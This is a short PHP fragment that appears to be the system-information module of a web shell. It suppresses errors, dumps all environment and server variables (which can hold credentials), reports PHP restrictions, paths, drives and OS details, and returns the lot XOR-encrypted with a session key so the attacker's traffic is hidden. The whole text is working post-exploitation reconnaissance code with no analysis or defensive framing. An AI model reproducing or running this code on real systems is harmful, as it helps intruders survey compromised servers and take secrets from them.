error_reporting(0);

function main() {
    session_start();
    $webPath = str_replace('\\', '/', getcwd());
    if (substr($webPath, -1) !== '/') {
        $webPath .= '/';
    }

    $driveList = '';
    if (stristr(PHP_OS, 'windows') || stristr(PHP_OS, 'winnt')) {
        for ($i = 65; $i <= 90; $i++) {
            $drive = chr($i) . ':/';
            if (file_exists($drive)) {
                $driveList .= $drive . ';';
            }
        }
    } else {
        $driveList = '/;';
    }

    $basic = "----------\r\n";
    foreach ($_ENV as $key => $value) {
        $basic .= $key . '=' . $value . "\r\n";
    }
    foreach ($_SERVER as $key => $value) {
        if (is_scalar($value)) {
            $basic .= $key . '=' . $value . "\r\n";
        }
    }
    $basic .= 'PHP_VERSION=' . PHP_VERSION . "\r\n";
    $basic .= 'disable_functions=' . ini_get('disable_functions') . "\r\n";
    $basic .= 'open_basedir=' . ini_get('open_basedir') . "\r\n";
    $basic .= "----------\r\n";

    $items = array(
        'BasicInfo' => $basic,
        'ClassPath' => $webPath,
        'WebPath' => $webPath,
        'DriveList' => $driveList,
        'os.name' => PHP_OS,
        'os.version' => php_uname('r'),
        'os.arch' => php_uname('m'),
        'OS' => stristr(PHP_OS, 'win') ? 'Windows' : 'Linux'
    );

    $result = '';
    foreach ($items as $key => $value) {
        $result .= $key . ':' . $value . "\r\n";
    }

    echo encrypt($result, $_SESSION['k']);
}

function encrypt($data, $key)
{
    for ($i = 0; $i < strlen($data); $i++) {
        $data[$i] = $data[$i] ^ $key[($i + 5) & 15];
    }
    return base64_encode($data);
}
